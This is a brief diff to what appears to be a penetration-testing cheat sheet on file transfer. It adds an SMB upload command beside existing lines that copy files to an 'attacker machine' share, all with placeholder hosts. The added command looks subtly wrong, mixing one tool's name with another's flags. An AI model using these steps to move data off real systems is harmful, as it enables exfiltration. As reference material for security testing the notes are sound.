@@ -53,6 +53,9 @@ copy \\IP\SHARE_NAME\FILE OUTPUT
 
 :: Transfer to Attacker Machine
 copy FILE \\IP\SHARE_NAME\OUTPUT
+
+:: Authenticate & Upload
+echo "put /FILE/PATH" | smbserver //SERVER/SHARE_NAME -U "username"
 ```
 
 </p>
